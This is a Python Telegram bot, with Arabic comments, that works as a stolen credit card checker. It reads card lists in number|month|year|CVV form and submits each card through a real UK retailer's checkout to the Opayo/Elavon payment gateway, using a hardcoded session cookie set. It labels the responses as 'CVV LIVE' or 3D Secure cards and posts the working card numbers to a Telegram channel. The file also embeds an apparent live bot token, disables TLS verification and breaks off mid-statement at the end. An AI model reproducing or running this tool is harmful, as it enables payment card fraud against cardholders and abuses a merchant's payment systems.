import os
import asyncio
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
from bs4 import BeautifulSoup
import json
import random
import string
import time
import re
from urllib.parse import urljoin, urlparse, parse_qs, unquote
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== الإعدادات ==========
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]
CHANNEL_ID = -1003154179190

# ========== Opayo Settings ==========
BASE = "https://www.rapidonline.com"
BASKET_URL = BASE + "/checkout/basket"
TOORDER_URL = BASE + "/checkout/basket/toorder"
PARAMS = {"pEx": "4"}
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

initial_cookies = {
    'lantern': 'acae1b5d-f800-4e2d-8364-1492a117d8c1',
    'wtstp_nv': '1',
    'wtstp_nv_s': '1',
    'wt_mcp_sid': '2802285916',
    'LPVID': 'IxZmZhMDIxYWNlNjkyNzdl',
    'LPSID-66449020': 'w51M_sGJTImLyqQzMUc-5Q',
    '.AspNet.Consent': 'yes',
    '_ra_func': 'true',
    '_ra_perf': 'true',
    '_ra_adv': 'true',
    '_ra_Initial': 'true',
    '_ga': 'GA1.1.932453915.1761758104',
    '__hstc': '57241397.72c5200adc9d6d8ebf2d8ae05e71125a.1761758106430.1761758106430.1761758106430.1',
    'hubspotutk': '72c5200adc9d6d8ebf2d8ae05e71125a',
    '__hssrc': '1',
    'CustomSearchUser': '20b5a52d-3c49-4540-bd99-834c3c36990e',
    'ra_Vat': 'false',
    'ra_NewType': '1',
    'Loop54User': 'ba495721-c02b-4464-9dc9-5b2a89c2af58',
    'ra_BAS': 'L3ZduBJfweo2kca9khjBJw%3D%3D',
    '.AspNetCore.Antiforgery.ewfMgV3Kz2g': 'CfDJ8IAvExQjoXNFuGlpY7xOM3RJzu-LaHt3ii3ADRgdoUH2nWn91Z-nGVVQb7zFGSnKrf4OKgLW_1sCCyJM3QAdF0_1V96pbpRy-2ZwyL6uKyz8QnMzqpbhEsxcIk2K2-KGkeBTknIKzJCy_HC7TlFc4ys',
    'ra_session': 'CfDJ8IAvExQjoXNFuGlpY7xOM3TJD4kqy8kVk6kVCtL1MaLncrAvGsYfuqvAKguiOqqIJ5nvChsN4WyCrXhVAOYEUoSvxN%2BhdhENvJ96YY1RhQ5TwZaSqC9ldGBNg6VqC0aaxR4Dv44R3jIzmMKkYD6VbGlf%2BK%2BdqAWgWCUp3e8Vz3UG',
}

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'approved': 0,
    'ccn': 0,
    'declined': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'error_details': {},
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'approved_cards': [],
    'ccn_cards': [],
}

# ========== Opayo Functions ==========
def analyze_response(html_content):
    """تحليل الاستجابة وإرجاع الحالة"""
    html_lower = html_content.lower()
    
    if 'paymentauthenticationchallenge' in html_lower or 'action="https://hk.paymentauthenticationchallenge' in html_lower:
        return "CCN", "3D Secure Challenge Required"
    
    if 'your payment is being authorised' in html_lower or 'opayo - authorisation' in html_lower:
        return "APPROVED", "Payment Approved - CVV LIVE"
    
    if '3d-authentication failed' in html_lower and 'rejected by the issuer' in html_lower:
        return "DECLINED", "3D Authentication Failed"
    
    if 'card expiry date is invalid' in html_lower:
        return "ERROR", "Invalid Expiry Date"
    
    if 'the card number is not valid' in html_lower:
        return "ERROR", "Invalid Card Number"
    
    if 'security code' in html_lower and 'invalid' in html_lower:
        return "ERROR", "Invalid CVV"
    
    if 'error processing transaction' in html_lower or 'server error' in html_lower:
        return "ERROR", "Transaction Error"
    
    return "UNKNOWN", "Unknown Response"

def get_opayo_cookies():
    """استخراج كوكيز Opayo من التدفق"""
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Referer": "https://www.rapidonline.com/checkout/order/redirect?pEx=4"})
    s.cookies.update(initial_cookies)
    
    try:
        r = s.get(BASKET_URL, params=PARAMS, timeout=30)
        soup = BeautifulSoup(r.text, "html.parser")
        
        uid = (soup.find("input", {"name": "UniqueRequestId"}) or {}).get("value")
        token = (soup.find("input", {"name": "__RequestVerificationToken"}) or {}).get("value")
        
        if not uid:
            m = re.search(r'name=["\']UniqueRequestId["\'][^>]*value=["\']([0-9a-f-]{36})["\']', r.text, re.I|re.S)
            uid = m.group(1) if m else None
        if not token:
            m = re.search(r'name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)["\']', r.text, re.I|re.S)
            token = m.group(1) if m else None
        
        if not uid or not token:
            return None
        
        headers_post = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": BASE,
            "referer": f"{BASKET_URL}?pEx=4",
            "x-requested-with": "XMLHttpRequest",
            "requestverificationtoken": token,
            "User-Agent": UA,
        }
        payload = {
            "CustomerOrderNumber": "",
            "ScheduleDate": "",
            "UniqueRequestId": uid,
            "PaymentProvider": "1",
            "Misc": "",
        }
        r2 = s.post(TOORDER_URL, headers=headers_post, data=payload, timeout=30, allow_redirects=False)
        
        redirect_url = None
        try:
            j = r2.json()
            redirect_url = j.get("RedirectUrl") if isinstance(j, dict) else None
        except Exception:
            pass
        if not redirect_url:
            redirect_url = r2.headers.get("Location")
        
        if not redirect_url:
            return None
        
        if redirect_url.startswith("/"):
            redirect_url = urljoin(BASE, redirect_url)
        
        qs = parse_qs(urlparse(redirect_url).query)
        if "paymenturl" in qs:
            opayo_url = unquote(qs["paymenturl"][0])
        else:
            opayo_url = redirect_url
        
        s.get(opayo_url, allow_redirects=True, timeout=30, verify=False)
        s.get("https://live.opayo.eu.elavon.com/gateway/service/carddetails", 
              headers={"Referer": opayo_url, "Origin": "https://live.opayo.eu.elavon.com"}, 
              allow_redirects=True, timeout=30, verify=False)
        
        wanted = "live.opayo.eu.elavon.com"
        def domain_match(cd, wd=wanted):
            if not cd: return False
            cd = cd.lstrip(".").lower(); wd = wd.lstrip(".").lower()
            return cd == wd or cd.endswith("."+wd)
        
        cookies = {c.name: c.value for c in s.cookies if domain_match(c.domain)}
        if not cookies:
            cookies = {c.name: c.value for c in s.cookies}
        
        return cookies
        
    except Exception as e:
        print(f"[!] خطأ في استخراج الكوكيز: {e}")
        return None

# ========== 🔥 إرسال النتائج للقناة ==========
async def send_to_channel(bot_app, card, status_type, message):
    """إرسال نتيجة مباشرة للقناة"""
    try:
        card_number = stats['approved'] + stats['ccn']
        
        if status_type == 'APPROVED':
            text = (
                "╔═══════════════════╗\n"
                "✅ **APPROVED CARD LIVE** ✅\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **CVV LIVE - Approved**\n"
                f"📊 Card #{card_number}\n"
                f"⚡️ Opayo Gateway\n"
                "╚═══════════════════╝"
            )
            stats['approved_cards'].append(card)
            
        elif status_type == 'CCN':
            text = (
                "╔═══════════════════╗\n"
                "⚠️ **CCN CARD (3D SECURE)** ⚠️\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **3D Secure Challenge**\n"
                f"📊 Card #{card_number}\n"
                f"⚡️ Opayo Gateway\n"
                "╚═══════════════════╝"
            )
            stats['ccn_cards'].append(card)
        
        await bot_app.bot.send_message(
            chat_id=CHANNEL_ID,
            text=text,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"[!] خطأ في إرسال رسالة للقناة: {e}")

# ========== فحص البطاقة ==========
async def check_card(card, bot_app):
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app)
        return card, "ERROR", "صيغة خاطئة"
    
    card_number, exp_month, exp_year, cvv = parts
    card_number = card_number.strip()
    exp_month = exp_month.strip().zfill(2)
    exp_year = exp_year.strip()
    
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]
    
    cvv = cvv.strip()
    
    # Get fresh cookies
    opayo_cookies = get_opayo_cookies()
    if not opayo_cookies:
        stats['errors'] += 1
        stats['error_details']['COOKIE_ERROR'] = stats['error_details'].get('COOKIE_ERROR', 0) + 1
        stats['checking'] -= 1
        stats['last_response'] = 'Cookie Error'
        await update_dashboard(bot_app)
        return card, "ERROR", "فشل في استخراج الكوكيز"
    
    headers_card = {
        'Host': 'live.opayo.eu.elavon.com',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="141", "Not?A_Brand";v="8"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://live.opayo.eu.elavon.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': UA,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'iframe',
        'Referer': 'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
        'Priority': 'u=0, i',
    }
    
    data_card = {
        'browserJavaEnabled': 'false',
        'browserColorDepth': '24',
        'browserScreenHeight': '786',
        'browserScreenWidth': '1397',
        'browserTZ': '-180',
        'challengeWindowSize': '05',
        'cardholder': 'details saad',
        'cardnumber': card_number,
        'expirymonth': exp_month,
        'expiryyear': exp_year,
        'securitycode': cvv,
        'action': 'proceed',
    }
    
    try:
        response = requests.post(
            'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
            cookies=opayo_cookies,
            headers=headers_card,
            data=data_card,
            verify=False,
            timeout=30
        )
        
        status, message = analyze_response(response.text)
        
        if status == "APPROVED":
            stats['approved'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Approved ✅'
            await update_dashboard(bot_app)
            await send_to_channel(bot_app, card, "APPROVED", message)
            return card, "APPROVED", message
            
        elif status == "CCN":
            stats['ccn'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'CCN ⚠️'
            await update_dashboard(bot_app)
            await send_to_channel(bot_app, card, "CCN", message)
            return card, "CCN", message
            
        elif status == "DECLINED":
            stats['declined'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Declined ❌'
            await update_dashboard(bot_app)
            return card, "DECLINED", message
            
        else:
            stats['errors'] += 1
            stats['error_details'][status] = stats['error_details'].get(status, 0) + 1
            stats['checking'] -= 1
            stats['last_response'] = f'{status}'
            await update_dashboard(bot_app)
            return card, status, message
            
    except Exception as e:
        stats['errors'] += 1
        stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app)
        return card, "EXCEPTION", str(e)

# ========== Dashboard ==========
def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="approved"),
            InlineKeyboardButton(f"⚠️ CCN: {stats['ccn']}", callback_data="ccn")
        ],
        [
            InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"),
            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"📡 Response: {stats['last_response']}", callback_data="response")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    """تحديث Dashboard في القناة"""
    if stats['dashboard_message_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=CHANNEL_ID,
                message_id=stats['dashboard_message_id'],
                text="📊 **OPAYO CARD CHECKER - LIVE** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass

# ========== 🔥 إنشاء الملفات النهائية ==========
async def send_final_files(bot_app):
    """إرسال ملفات txt للبطاقات المقبولة"""
    try:
        if stats['approved_cards']:
            approved_text = "\n".join(stats['approved_cards'])
            with open("approved_cards.txt", "w") as f:
                f.write(approved_text)
            await bot_app.bot.send_document(
                chat_id=CHANNEL_ID,
                document=open("approved_cards.txt", "rb"),
                caption=f"✅ **Approved Cards (CVV LIVE)** ({len(stats['approved_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("approved_cards.txt")
        
        if stats['ccn_cards']:
            ccn_text = "\n".join(stats['ccn_cards'])
            with open("ccn_cards.txt", "w") as f:
                f.write(ccn_text)
            await bot_app.bot.send_document(
                chat_id=CHANNEL_ID,
                document=open("ccn_cards.txt", "rb"),
                caption=f"⚠️ **CCN Cards (3D Secure)** ({len(stats['ccn_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("ccn_cards.txt")
        
    except Exception as e:
        print(f"[!] خطأ في إرسال الملفات: {e}")

# ========== معالجات البوت ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج أمر /start"""
    user_id = update.effective_user.id
    print(f"[📥] /start command from user: {user_id}")
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **OPAYO CARD CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        f"📢 القناة: `{CHANNEL_ID}`\n\n"
        "✅ البوت شغال وجاهز!",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج الملفات"""
    user_id = update.effective_user.id
    print(f"[📥] File received from user: {user_id}")
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats.update({
        'total': len(cards),
        'checking': 0,
        'approved': 0,
        'ccn': 0,
        'declined': 0,
        'errors': 0,
        'current_card': '',
        'error_details': {},
        'last_response': 'Starting...',
        'cards_checked': 0,
        'approved_cards': [],
        'ccn_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await context.application.bot.send_message(
        chat_id=CHANNEL_ID,
        text="📊 **OPAYO CARD CHECKER - LIVE** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    await update.message.reply_text(
        f"✅ تم بدء الفحص!\n\n"
        f"📊 إجمالي البطاقات: {len(cards)}\n"
        f"📢 تابع النتائج في القناة",
        parse_mode='Markdown'
    )
    
    def run_checker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process_cards(cards, context.application))
        loop.close()
    
    threading.Thread(target=run_checker, daemon=True).start()

async def process_cards(cards, bot_app):
    """معالجة البطاقات"""
    for i, card in enumerate(cards):
        if not stats['is_running']:
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app)
        
        await check_card(card, bot_app)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 5 == 0:
            await update_dashboard(bot_app)
        
        await asyncio.sleep(2)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app)
    
    summary_text = (
        "═══════════════════\n"
        "✅ **اكتمل الفحص!** ✅\n"
        "═══════════════════\n\n"
        f"📊 **الإحصائيات النهائية:**\n"
        f"🔥 الإجمالي: {stats['total']}\n"
        f"✅ Approved (CVV LIVE): {stats['approved']}\n"
        f"⚠️ CCN (3D Secure): {stats['ccn']}\n"
        f"❌ Declined: {stats['declined']}\n"
        f"⚠️ Errors: {stats['errors']}\n\n"
        "📁 **جاري إرسال الملفات...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=CHANNEL_ID,
        text=summary_text,
        parse_mode='Markdown'
    )
    
    await send_final_files(bot_app)
    
    final_text = (
        "╔═══════════════════╗\n"
        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
        "╚═══════════════════╝\n\n"
        "✅ تم إرسال جميع الملفات\n"
        "📊 شكراً لاستخدامك البوت!\n\n"
        "⚡️ Opayo Gateway"
    )
    
    await bot_app.bot.send_message(
        chat_id=CHANNEL_ID,
        text=final_text,
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج الرسائل النصية"""
    user_id = update.effective_user.id
    print(f"[📥] Message from user: {user_id}")
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    await update.message.reply_text(
        "👋 مرحباً!\n\n"
        "استخدم /start لبدء البوت\n"
        "أو أرسل ملف .txt مباشرة"
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج الأزرار"""
    query = update.callback_query
    user_id = query.from_user.id
    
    print(f"[📥] Button callback from user: {user_id}, data: {query.data}")
    
    if user_id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    await query.answer()
    
    if query.data == "stop_check":
        stats['is_running'] = False
        await update_dashboard(context.application)
        await query.message.reply_text("🛑 تم إيقاف الفحص!")
    elif query.data == "send_file":
        await query.message.reply_text(
            "📁 أرسل ملف .txt يحتوي على البطاقات\n"
            "الصيغة: `رقم|شهر|سنة|cvv`",
            parse_mode='Markdown'
        )

def main():
    """الدالة الرئيسية"""
    print("=" * 50)
    print("[🤖] Starting Opayo Telegram Bot...")
    print(f"[📢] Channel ID: {CHANNEL_ID}")
    print(f"[👤] Admin IDs: {ADMIN_IDS}")
    print("=" * 50)
    
    # إنشاء التطبيق
    app = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("[✅] Bot handlers registered successfully!")
    print("[🔄] Starting polling...")
    
    # بدء البوت
    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True
    )

if
